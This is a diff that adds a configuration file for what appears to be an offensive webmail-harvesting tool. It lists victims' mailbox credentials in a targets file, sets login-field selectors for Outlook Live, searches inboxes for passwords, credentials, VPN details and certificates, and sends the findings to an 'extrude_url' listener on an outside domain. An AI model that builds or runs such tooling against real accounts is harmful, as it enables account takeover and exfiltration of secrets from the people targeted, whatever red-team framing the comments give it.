@@ -1,0 +1,35 @@
+# json array with mailbox-type/user/passwd of victims
+# mailbox-type allows for concurrent data harvesting across different webmails
+targets: "targets.json"
+
+# what to search for while in the mailbox context
+search_keywords: ['password' , 'credentials' , 'vpn' , 'certificate']
+
+# keep this low unless you have 'pepe al culo' on an engagement
+# also, make sure you adjust login/injection delays when using a pool > 3
+thread_pool: 2
+
+# if you use extrude_listener for this, make sure you have a valid SSL cert/key
+# for the domain, and change the following lines:
+#  :private_key_file => "#{File.dirname(__FILE__)}/your_domain.key",
+#  :cert_chain_file  => "#{File.dirname(__FILE__)}/your_domain.crt",
+extrude_url: "https://your_domain"
+
+# supported webmails and Login URLs
+webmails:
+   outlook_live:
+      # username/password fields
+      user_field:   "i0116"
+      passwd_field: "passwd"
+
+      # the Sign In or Login buttons
+      button_field: "idSIButton9"
+
+      # the id of an element available only post-authentication
+      # this is used to determine if login was successful or not
+      detect_login: "o365cs-nav-brandingText"
+
+      # main login url
+      url: "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1476976971&rver=6.6.6556.0&wp=MBI_SSL&wreply=https://outlook.live.com/owa/&id=292841&CBCXT=out&fl=wld&cobrandid=90015"
+#   roundcube:
+#      url: "https://roundcube_url.com"
